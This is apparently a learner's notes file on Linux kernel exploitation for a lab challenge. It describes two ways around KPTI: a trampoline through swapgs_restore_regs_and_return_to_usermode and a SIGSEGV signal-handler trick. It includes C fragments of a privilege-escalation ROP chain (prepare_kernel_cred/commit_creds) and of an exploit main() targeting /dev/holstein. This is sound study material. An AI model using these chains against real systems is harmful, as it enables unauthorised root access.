some prerequisites...

### What KPTI really is?

read this [description](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#adding-kpti) or [this](https://github.com/5o1z/kNotes/tree/main/LKE/LK01/HolsteinV1#exploit-bypass-kpti-with-smep-smap-and-no-aslr)

**TL;DR**:

...`KPTI` **separating user-space and kernel-space page tables** entirely, isolating user space and kernel space memory... Our `ROP` exploit above will `segment fault` because even though we have return to the usermode, the page table it is using is still the kernel's, with all the pages in userland marked as non-executable...

### Bypass KPTI with Trampoline

Kernel has method of transitioning between userspace and kernelspace page tables.

How it works and how to abuse? Read [this](https://github.com/vilesport/Kernel-exploit/tree/main/Kernel%20Exploit%20Basics/LK01/HTV1#swapgs_restore_regs_and_return_to_usermode) and [this](https://github.com/5o1z/kNotes/tree/main/LKE/LK01/HolsteinV1#bypass-kpti-with-trampoline)

**Summary**:

There is a function in kernel handle transitioning between userspace and kernelspace, names `swapgs_restore_regs_and_return_to_usermode`.

So instead of ROP directly to `swaps` and `iretq` gadgets, just need to ROP into that function, similar to this:

```C
    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs_n_ret2usr_chain;
    rop[inc] = 0; // [rdi]
    rop[inc] = 0; // [rdi + 8]
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
```

### Bypass KPTI with Signal Handler

> remember SROP in userland?

From the result that `sigsev` is in the userland, so if the current program have signal handler `SIGSEGV` code with the function handle is `get_shell`, when program hit `SIGSEGV` it will call `get_shell` with cleared `cr3` and no more hit `SIGSEGV` by `KPTI`.

**Summary**:

Use the same exploit code from `krop` exploit, then assign a signal handler for `sigsegv`, similar to this:

```C
...
int main()
{
    signal(SIGSEGV, win);

    save_state();
    
    dev_fd = open("/dev/holstein", 2);
    if(dev_fd < 1) puts("[!] fail fd");

    prepare_rop_chain();
    overflow();

    puts("[!] should never be reached");
}
...
```

**Question**:

From [lkmidas](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/#introduction-1):

 > ...I still don’t fully understand this though, because for whatever reasons, even though the handler `get_shell()` itself also resides in non-executable pages, it can still be executed normally if a `SIGSEGV` is caught (instead of looping the handler indefinitely or fallback to default handler or undefined behavior, etc.), but it does work...
 
Is [this](https://unix.stackexchange.com/questions/80044/how-signals-work-internally) the answer?

> ...If the disposition is handle, then it means there is a function in the user program which is designed to handle the signal in question and the pointer to this function will be in the aforementioned data structure. In this case `do_signal()` calls another kernel function, `handle_signal()`, which then goes through the process of switching back to user mode and calling this function. The details of this handoff are extremely complex. This code in your program is usually linked automatically into your program when you use the functions in `signal.h`....

### Bypass KPTI with User Mode Helpers

(update this)

Have not learned it yet but [here](https://blog.wohin.me/posts/linux-kernel-pwn-01/) (maybe [this](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/) too)...

### KPTI: +smep, +smap, kpti=on, no kaslr

 No comment

> both exploit in the same folder